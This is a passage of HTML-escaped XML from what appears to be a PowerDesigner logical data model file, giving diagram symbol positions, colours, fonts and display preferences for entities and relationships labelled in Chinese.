(-17550,12659))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((-18843,-376),(-18843,6409),(-18750,6409),(-18750,12259))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;4627&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;a:AutomaticRoutingState&gt;3&lt;/a:AutomaticRoutingState&gt;&lt;c:SourceSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o8&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o17&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Relationship Ref=&quot;o18&quot;/&gt;&lt;/c:Object&gt;&lt;/o:RelationshipSymbol&gt;&lt;o:RelationshipSymbol Id=&quot;o19&quot;&gt;&lt;a:ModificationDate&gt;1618325752&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((-7972,-1220), (-880,11398))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((-6832,10998),(-6832,-408),(-1280,-408))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;5906&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;a:AutomaticRoutingState&gt;3&lt;/a:AutomaticRoutingState&gt;&lt;c:SourceSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o17&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o11&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Relationship Ref=&quot;o20&quot;/&gt;&lt;/c:Object&gt;&lt;/o:RelationshipSymbol&gt;&lt;o:EntitySymbol Id=&quot;o8&quot;&gt;&lt;a:ModificationDate&gt;1618325792&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-26965,-2531), (-9099,3181))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 Arial,8,UIdentifiers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;a:ManuallyResized&gt;1&lt;/a:ManuallyResized&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o21&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;o:EntitySymbol Id=&quot;o11&quot;&gt;&lt;a:ModificationDate&gt;1618325795&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-1280,-3962), (21102,3146))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 Arial,8,UIdentifiers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;a:ManuallyResized&gt;1&lt;/a:ManuallyResized&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o22&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;o:EntitySymbol Id=&quot;o14&quot;&gt;&lt;a:ModificationDate&gt;1618325806&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((5057,10682), (25239,16358))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 Arial,8,UIdentifiers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;a:ManuallyResized&gt;1&lt;/a:ManuallyResized&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o23&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;o:EntitySymbol Id=&quot;o7&quot;&gt;&lt;a:ModificationDate&gt;1618325798&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-6812,-23512), (15512,-15212))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 Arial,8,UIdentifiers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;a:ManuallyResized&gt;1&lt;/a:ManuallyResized&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o24&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;o:EntitySymbol Id=&quot;o17&quot;&gt;&lt;a:ModificationDate&gt;1618327271&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-19422,10609), (-3099,17801))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:FillColor&gt;1422826&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 新宋体,8,UEntityForeignAttribute 0 新宋体,8,NIdentifiers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;a:ManuallyResized&gt;1&lt;/a:ManuallyResized&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o25&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;/c:Symbols&gt;&lt;/o:LogicalDiagram&gt;&lt;o:LogicalDiagram Id=&quot;o26&quot;&gt;&lt;a:ObjectID&gt;74E6538B-016D-4AA9-9C57-D0BAD0C88CCA&lt;/a:ObjectID&gt;&lt;a:Name&gt;表二&lt;/a:Name&gt;&lt;a:Code&gt;表二&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618327403&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618331857&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DisplayPreferences&gt;[DisplayPreferences][DisplayPreferences\\LDM][DisplayPreferences\\General]Adjust to text=YesSnap Grid=NoConstrain Labels=YesDisplay Grid=NoShow Page Delimiter=NoShow Links intersections=YesActivate automatic link routing=YesGrid size=800Graphic unit=2Window color=255 255 255Background image=Background mode=8Watermark image=Watermark mode=8Show watermark on screen=NoGradient mode=0Gradient end color=255 255 255Show Swimlane=NoSwimlaneVert=YesTreeVert=NoCompDark=0[DisplayPreferences\\Object]Show Icon=NoMode=0Trunc Length=80Word Length=80Word Text=!&amp;quot;&amp;quot;#$%&amp;amp;&amp;#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\\]^_`&#123;|&#125;~Shortcut IntIcon=YesShortcut IntLoct=YesShortcut IntFullPath=NoShortcut IntLastPackage=YesShortcut ExtIcon=YesShortcut ExtLoct=NoShortcut ExtFullPath=NoShortcut ExtLastPackage=YesShortcut ExtIncludeModl=YesEObjShowStrn=YesExtendedObject.Comment=NoExtendedObject.IconPicture=NoExtendedObject.TextStyle=NoExtendedObject_SymbolLayout=ELnkShowStrn=YesELnkShowName=YesExtendedLink_SymbolLayout=ExtDpdShowStrn=YesExtendedDependency_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Stereotype&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;FileObject.Stereotype=NoFileObject.DisplayName=YesFileObject.LocationOrName=NoFileObject.IconPicture=NoFileObject.TextStyle=NoFileObject.IconMode=YesFileObject_SymbolLayout=Package.Stereotype=YesPackage.Comment=NoPackage.IconPicture=NoPackage.TextStyle=NoPackage_SymbolLayout=Display Model Version=YesEntity.Stereotype=YesEntity.Attributes=YesEntity.Attributes._Filter=所有属性 LDMPENTALLEntity.Attributes._Columns=Stereotype DomainOrDataType IdentifierIndicator NullIndicatorEntity.Attributes._Limit=-5Entity.Identifiers=YesEntity.Identifiers._Columns=Stereotype IdentifierIndicatorEntity.Comment=NoEntity.IconPicture=NoEntity.TextStyle=NoEntity_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Attributes&amp;quot; Collection=&amp;quot;Attributes&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIdentifierIndicator No 标识符指标\\r\\nDataType No\\r\\nDomainOrDataType No 域或数据类型\\r\\nDomain No\\r\\nNullIndicator No 强制性&amp;quot; Filters=&amp;quot;所有属性 LDMPENTALL &amp;amp;quot;&amp;amp;quot;\\r\\n主属性 LDMPENTPK &amp;amp;quot;\\&amp;amp;quot;PIDTF \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;\\r\\n识别属性 LDMPENTIDTF &amp;amp;quot;\\&amp;amp;quot;AIDF \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Identifiers&amp;quot; Collection=&amp;quot;Identifiers&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIdentifierIndicator No 标识符指标&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Relationship.Entity1ToEntity2Role=YesRelationship.Entity2ToEntity1RoleCardinality=NoRelationship.Entity1ToEntity2RoleDominant=YesRelationship.Stereotype=YesRelationship.DisplayName=YesRelationship.JoinExpression=NoRelationship.Entity2ToEntity1Role=YesRelationship.Entity1ToEntity2RoleCardinality=NoRelationship.Entity2ToEntity1RoleDominant=YesRelationship_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Entity1ToEntity2Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Role&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Entity2ToEntity1RoleCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Dominance&amp;quot; Attribute=&amp;quot;Entity1ToEntity2RoleDominant&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Dominance&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;No&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;连接&amp;quot; Attribute=&amp;quot;JoinExpression&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;连接&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Entity2ToEntity1Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Role&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Entity1ToEntity2RoleCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Dominance&amp;quot; Attribute=&amp;quot;Entity2ToEntity1RoleDominant&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Dominance&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Inheritance.Stereotype=YesInheritance.DisplayName=YesInheritance.IconPicture=NoInheritance.TextStyle=NoInheritance_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;[DisplayPreferences\\Symbol][DisplayPreferences\\Symbol\\FRMEOBJ]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=6000Height=2000Brush color=255 255 255Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=64Brush gradient color=192 192 192Brush background image=Custom shape=Custom text mode=0Pen=1 0 255 128 128Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\FRMELNK]CENTERFont=Arial,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 255Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\USRDEPD]CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=2 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\FILO]OBJSTRNFont=新宋体,8,NOBJSTRNFont color=0 0 0DISPNAMEFont=新宋体,8,NDISPNAMEFont color=0 0 0LCNMFont=新宋体,8,NLCNMFont color=0 0 0AutoAdjustToText=YesKeep aspect=YesKeep center=YesKeep size=NoWidth=2400Height=2400Brush color=255 255 255Fill Color=NoBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 0 0 255Shadow color=192 192 192Shadow=-1[DisplayPreferences\\Symbol\\LDMPCKG]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3600Brush color=255 255 192Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 178 178 178Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMENTT]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AttributesFont=Arial,8,NAttributesFont color=0 0 0EntityPrimaryAttributeFont=Arial,8,UEntityPrimaryAttributeFont color=0 0 0EntityForeignAttributeFont=Arial,8,NEntityForeignAttributeFont color=0 0 0IdentifiersFont=Arial,8,NIdentifiersFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=4000Brush color=234 181 21Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMRLSH]SOURCEFont=新宋体,8,NSOURCEFont color=0 0 0CENTERFont=新宋体,8,NCENTERFont color=0 0 0DESTINATIONFont=新宋体,8,NDESTINATIONFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMINHR]STRNFont=新宋体,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AutoAdjustToText=NoKeep aspect=NoKeep center=NoKeep size=YesWidth=1575Height=1000Brush color=250 241 211Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMLINH]CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\Free Symbol]Free TextFont=Arial,8,NFree TextFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0&lt;/a:DisplayPreferences&gt;&lt;a:PaperSize&gt;(8268, 11693)&lt;/a:PaperSize&gt;&lt;a:PageMargins&gt;((315,354), (433,354))&lt;/a:PageMargins&gt;&lt;a:PageOrientation&gt;1&lt;/a:PageOrientation&gt;&lt;a:PaperSource&gt;15&lt;/a:PaperSource&gt;&lt;c:Symbols&gt;&lt;o:RelationshipSymbol Id=&quot;o27&quot;&gt;&lt;a:CreationDate&gt;1618331857&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618331955&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((-24495,6359), (-16582,8759))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((-24095,7559),(-17982,7559))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;4627&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;c:SourceSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o28&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o29&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Relationship Ref=&quot;o30&quot;/&gt;&lt;/c:Object&gt;&lt;/o:RelationshipSymbol&gt;&lt;o:RelationshipSymbol Id=&quot;o31&quot;&gt;&lt;a:CreationDate&gt;1618331857&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618331961&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((-10740,-4624), (-8340,5900))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((-9540,4500),(-9540,-4224))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;4882&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;c:SourceSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o29&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o32&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Relationship Ref=&quot;o33&quot;/&gt;&lt;/c:Object&gt;&lt;/o:RelationshipSymbol&gt;&lt;o:EntitySymbol Id=&quot;o28&quot;&gt;&lt;a:CreationDate&gt;1618328383&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-45085,3360), (-24095,10978))&lt;/a:Rect&gt;&lt;a:LineColor&gt;16512&lt;/a:LineColor&gt;&lt;a:FillColor&gt;1422826&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 Arial,8,UEntityForeignAttribute 0 Arial,8,NIdentifiers 0 Arial,8,NLABL 0 